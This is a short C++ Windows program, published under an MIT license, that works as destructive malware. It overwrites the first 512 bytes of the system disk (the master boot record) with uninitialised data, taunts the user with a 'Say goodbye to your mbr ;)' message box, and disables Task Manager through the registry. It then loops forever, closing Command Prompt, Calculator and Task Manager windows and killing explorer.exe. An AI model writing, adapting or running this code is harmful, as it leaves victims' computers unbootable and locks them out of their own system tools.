/*

Copyright 2019 Fatih Melih ÖZGÜN

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the 
Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the
Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED,
INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,
 WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.




*/

#include <iostream>
#include <Windows.h>
using namespace std;
HWND hwnd;


int  WINAPI WinMain(HINSTANCE inst, HINSTANCE prev, LPSTR cmd, int show)
{
	hwnd = NULL;
/////////////////////////////////////////////////////////////
	DWORD write;
	
	char mbrData[512];
	//ZeroMemory(&mbrData, (sizeof mbrData);
	HANDLE MasterBootRecord = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	
		if (WriteFile(MasterBootRecord, mbrData, 512, &write, NULL) == TRUE)
		{
			MessageBox(hwnd, "Mocrosoft Wondows", "Say goodbye to your mbr ;)", NULL);
		}
		else
		{

		}
		CloseHandle(MasterBootRecord);
////////////////////////////////////////////////////////////////////////////
	system("REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System / v DisableTaskMgr / t REG_DWORD / d 1 / f");
	while (1)
	{
		
		if ((hwnd = FindWindow(NULL, "Command Prompt")) != NULL)
		{

			CloseWindow(hwnd);
			mciSendString("set cdaudio door open", NULL, NULL, NULL);

			system("taskkill /f /im explorer.exe");
			Beep(1521, 400);
			CloseWindow(hwnd);
			hwnd = NULL;
		}

		if ((hwnd = FindWindow(NULL, "Calculator")) != NULL)
	         {
		
				CloseWindow(hwnd);
				//system("taskkill /f /im explorer.exe");
				mciSendString("set cdaudio door open", NULL, NULL, NULL);
				Beep(1521, 400);
				CloseWindow(hwnd);
			hwnd = NULL;
			}
	
		if ((hwnd = FindWindow(NULL, "Task Manager")) != NULL)
		{
			CloseWindow(hwnd);
			system("taskkill /f /im explorer.exe");
			mciSendString("set cdaudio door open", NULL, NULL, NULL);
				Beep(1521, 400);
			CloseWindow(hwnd);
			hwnd = NULL;
		}


	}


	
	return 0;
}




	


